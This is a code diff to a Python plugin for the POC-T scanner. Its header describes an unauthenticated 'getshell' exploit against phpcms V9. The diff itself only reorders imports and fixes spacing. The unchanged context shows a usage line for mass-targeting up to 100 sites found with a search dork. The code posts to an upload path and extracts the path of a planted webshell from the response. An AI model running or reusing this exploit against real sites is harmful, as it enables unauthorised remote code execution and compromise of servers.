@@ -8,10 +8,12 @@ phpcms-V9 前台getshell 无需登录
 python POC-T -s phpcmsV9-getshell -aG "power by phpcmsV9" --limit 100
 """
 
-import requests
 import re
-from plugin.util import randomString
+
+import requests
+
 from plugin.util import randomDigits
+from plugin.util import randomString
 
 
 def poc(url):
@@ -37,7 +39,7 @@ def poc(url):
     }
 
     try:
-        r = requests.post(url=upload_path, data=post_data, headers=headers,time=3)
+        r = requests.post(url=upload_path, data=post_data, headers=headers, time=3)
         if r.status_code is 200 and 'INSERT' in r.content:
             shell_path = re.findall(parttern, r.content, re.I | re.M)  # 提取webshell路径
             return shell_path
